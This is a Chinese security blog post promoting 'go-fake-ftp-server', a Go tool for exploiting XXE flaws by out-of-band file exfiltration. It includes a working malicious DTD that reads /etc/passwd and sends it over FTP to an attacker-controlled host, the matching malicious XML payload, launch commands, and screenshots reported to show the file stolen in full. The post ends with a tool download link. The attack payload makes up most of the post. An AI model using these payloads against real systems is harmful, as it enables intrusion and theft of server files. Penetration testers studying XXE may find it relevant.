#  XXE漏洞测试工具 -- go-fake-ftp-server（2月6日更新）  
z9nn8w
                    z9nn8w  网络安全者   2026-02-09 03:42  
  
===================================  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。  
个人微信：ivu123ivu  
  
  
**0x01 工具介绍**  
  
使用Go编写的用于测试XXE漏洞的工具，通过伪造FTP服务外带文件数据。HTTP服务默认运行于 8008 端口，默认用同目录下的evil.dtd作为http响应的恶意dtd文件。FTP服务默认运行于 2121 端口。  
```
./fake-ftp-server -h
Usage of ./fake-ftp-server:
  -file string
        evil dtd file (default "evil.dtd")
  -ftpport string
        FTP server port (default "2121")
  -httpport string
        HTTP server port (default "8008")
```  
  
  
**0x02 安装与使用**  
  
编写evil.dtd放于程序同目录下：  
```
<!ENTITY % c SYSTEM "file:///etc/passwd">
<!ENTITY % d "<!ENTITY &
#37
; e SYSTEM 'ftp://ip:FTPport/%c;'>">
%d;
```  
  
恶意xml文档：  
```
<?xml version="1.0"?>
<!DOCTYPE a [
   <!ENTITY % b SYSTEM "http://ip:HTTPport/"> 
   %b; 
   %e; 
]>
<a></a>
```  
  
执行fake-ftp-server程序，按照默认参数值启动：  
```
./fake-ftp-server
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PQNvx9ufMAgWHzM7AGsWCDqeUysQ76u5UbowQFQrjrNCI8VzwdFic3K6xhbFwIG9lWz6t2sKtt6sjDsFLfXPLrKkhfuDjQ16uQzfgg52QfaI/640?wx_fmt=png&from=appmsg "")  
  
上传恶意xml文档到存在XXE漏洞的服务器进行测试，HTTP服务：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PQNvx9ufMAg2t6egOG1An3sPV2rYLBibZ8rN97mEopWcpmu0GcuIgfiaFQDPicaPnicicQq3MYUNGIsAJQLciaawxXX5uiakgKIvTeB1YVc8Nb7Psg/640?wx_fmt=png&from=appmsg "")  
  
FTP服务，成功获取/etc/passwd完整内容：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PQNvx9ufMAghdKxB8CpmJj6Zutnc6iaulpkPsric8Pn39LOgw4FtuRvOJian20QAvt77wpFQW2u0YsHp61iaYUsOLmlBSibialG7oA60AwF6iaOiaCs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PQNvx9ufMAjTeVIRzsj287g3JZoyO8tPXPvkm03oRohBLZt7qLv6CLRrn3zRT3WEkKXmQvKoBPBiaQNhJ9R9mbgjMUYvF3xicicDbibyvzfpPoY/640?wx_fmt=png&from=appmsg "")  
  
也可以指定参数启动：  
```
./fake-ftp-server -file=1.dtd -httpport=8009 -ftpport=2122
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PQNvx9ufMAhp1ONP2rBJMNUyCialiaQeVXawLKw8jSe1iahbic6PgoFaT42EbhcfnCaYd048767TpCOIiarkx8zKx9OPs7gSMib0bx0RUT7q5MmkM/640?wx_fmt=png&from=appmsg "")  
  
修改恶意dtd和xml文档为对应服务端口，同样能实现外带文件的功能：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PQNvx9ufMAhmicicBVZiadHE2hq17gyqRYhFe7qj7EnxEMH1Vs6IVibezfmIxzn4P9dJjplqp9OF6cCkvpY4EpzEfCAibbicx4nWzwIW5kRphwn24/640?wx_fmt=png&from=appmsg "")  
  
一定要在虚拟机运行，工具下载链接：  
  
https://pan.quark.cn/s/31a496860b2c  
  
  
  
**·****今 日 推 荐**  
**·**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PQNvx9ufMAjJYXzmDic5UEVR3gVZEicJJMFH5r3H1yNibpW99VF2tcChGs8Y4Iia6Z7UaLJDJ6VwAKv394ul1Yt7icq4ZTPzSFQPjXhptPhAurJw/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PQNvx9ufMAgI8qbSPIX1HkSLj77PqnmyaljYbpAvehbbI1ZAUjMVLjDyh2Jb7yHCYPu8e7icPTavhWDuUp3IF74XBaDwWG4mZEs0ibcZOfk1U/640?wx_fmt=png&from=appmsg "")  
  
